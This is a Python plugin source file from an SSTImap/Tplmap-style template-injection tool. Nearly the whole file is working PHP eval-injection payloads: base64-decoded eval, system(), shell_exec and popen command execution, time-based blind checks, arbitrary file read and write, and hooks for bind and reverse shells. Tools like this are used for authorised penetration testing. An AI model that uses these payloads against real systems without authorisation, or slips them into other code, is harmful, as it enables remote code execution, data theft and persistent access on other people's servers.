from core import bash
from core.plugin import Plugin
from utils import closures
from utils import rand


class Php(Plugin):
    header_type = "add"
    priority = 8
    plugin_info = {
        "Description": """Eval injections in PHP. Base for PHP-based template engines""",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap plugin
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
    }

    def language_init(self):
        self.update_actions({
            'render': {
                'call': 'inject',
                'render': """{code}""",
                'header': """print({header[0]}+{header[1]});""",
                'trailer': """print({trailer[0]}+{trailer[1]});""",
                'test_render': f'print({rand.randints[0]}+{rand.randints[1]});',
                'test_render_expected': f'{rand.randints[0]+rand.randints[1]}'
            },
            'render_error': {
                'call': 'inject',
                'render': """{code}""",
                # "abc"() tries to call function abc
                'header': """fopen(join("",["Y:/A:/",strval({header[0]}+{header[1]}),rtrim(strval(""",
                'trailer': """)),strval({trailer[0]}+{trailer[1]})]),"r");""",
                'test_render': f'{rand.randints[0]}+{rand.randints[1]}',
                'test_render_expected': f'{rand.randints[0]+rand.randints[1]}'
            },
            'boolean': {
                'call': 'evaluate_blind',
                'test_bool_true':  "'2' + '3' == 5",
                'test_bool_false': "'2' + '5' == 3",
                'verify_bool_true':  "strlen('2') == 1",
                'verify_bool_false': "strlen('1') == 2"
            },
            'blind': {
                'call': 'evaluate_blind',
                'test_bool_true': """True""",
                'test_bool_false': """False"""
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """{code}""",
                'test_os': 'echo PHP_OS;',
                'test_os_expected': r'^[\w-]+$'
            },
            'evaluate_error': {
                # Dirty hack from Twig
                'call': 'execute',
                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """$d="{code_b64}";1 / (true && eval("return (" . base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%4,'=',STR_PAD_RIGHT)) . ");"));"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%4,'=',STR_PAD_RIGHT)) . ") && sleep({delay});");"""
            },
            'execute': {
                'call': 'evaluate',
                'execute': """$d="{code_b64}";system(base64_decode(str_pad(strtr($d,'-_','+/'),strlen($d)%4,'=',STR_PAD_RIGHT)));""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'execute_error': {
                'call': 'render',
                # Using shell_exec to get full output
                'execute': """shell_exec(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)))"""
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """$d="{code_b64}";1 / (pclose(popen(base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%4,'=',STR_PAD_RIGHT)), "wb")) == 0);"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """$d="{code_b64}";system(base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%4,'=',STR_PAD_RIGHT)). " && sleep {delay}");"""
            },
            'bind_shell': {
                'call': 'execute_blind',
                'bind_shell': bash.bind_shell
            },
            'reverse_shell': {
                'call': 'execute_blind',
                'reverse_shell': bash.reverse_shell
            },
            'write': {
                'call': 'evaluate',
                'write': """$d="{chunk_b64}"; file_put_contents("{path}", base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%4,'=',STR_PAD_RIGHT)),FILE_APPEND);""",
                'truncate': """file_put_contents("{path}", "");"""
            },
            'read': {
                'call': 'evaluate',
                'read': """print(base64_encode(file_get_contents("{path}")));"""
            },
            'md5': {
                'call': 'evaluate',
                'md5': """is_file("{path}") && print(md5_file("{path}"));"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            # This terminates the statement with ;
            {'level': 1, 'prefix': '{closure};', 'suffix': '//', 'closures': ctx_closures},
            # This does not need termination e.g. if(%s) {}
            {'level': 2, 'prefix': '{closure}', 'suffix': '//', 'closures': ctx_closures},
            # Comment blocks
            {'level': 5, 'prefix': '*/', 'suffix': '/*'},
        ])

    language = 'php'


ctx_closures = {
        1: [
            closures.close_single_double_quotes + closures.integer,
            closures.close_function + closures.empty
        ],
        2: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.empty
        ],
        3: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        4: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        5: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty,
            closures.close_function + closures.close_list + closures.empty,
        ]
}
